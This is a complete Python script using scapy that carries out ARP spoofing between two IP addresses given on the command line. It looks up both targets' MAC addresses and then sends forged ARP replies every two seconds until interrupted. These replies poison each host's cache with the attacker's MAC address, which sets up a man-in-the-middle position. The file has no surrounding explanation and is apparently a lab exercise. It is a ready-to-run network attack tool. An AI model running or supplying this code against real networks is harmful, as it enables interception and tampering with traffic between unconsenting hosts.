# -*- coding: utf-8 -*-         DO NOT REMOVE THIS LINE

from scapy.all import ARP, Ether, srp, send, conf, get_if_hwaddr
import sys, time

if len(sys.argv) != 3:
    print("Usage: sudo python3 arp_spoof.py <IP_target1> <IP_target2>")
    sys.exit(1)

ip1 = sys.argv[1]
ip2 = sys.argv[2]

# Send ARP request to get the MAC adress of the target IP
def get_mac(ip):
    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=2, verbose=False)
    for send_pkt, recv_pkt in answered:
        return recv_pkt[Ether].src
    return None

mac1 = get_mac(ip1)
mac2 = get_mac(ip2)
if mac1 is None or mac2 is None:
    print("Error : None")
    sys.exit(1)

print(f"MAC of {ip1} : {mac1}")
print(f"MAC of {ip2} : {mac2}")

# MAC adress of the hacker
attacker_mac = get_if_hwaddr(conf.iface)
print(f"Attacker's MAC : {attacker_mac}")

print("Continuous ARP packets sent ... (Ctrl-C to stop)")
try:
    while True:
        # Spoof h1 (as if attacker was h2 )
        send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst=mac1, hwsrc=attacker_mac), verbose=False)
        # Same
        send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst=mac2, hwsrc=attacker_mac), verbose=False)
        time.sleep(2) 
except KeyboardInterrupt:
    print("\n KeyboardInterrupt : end")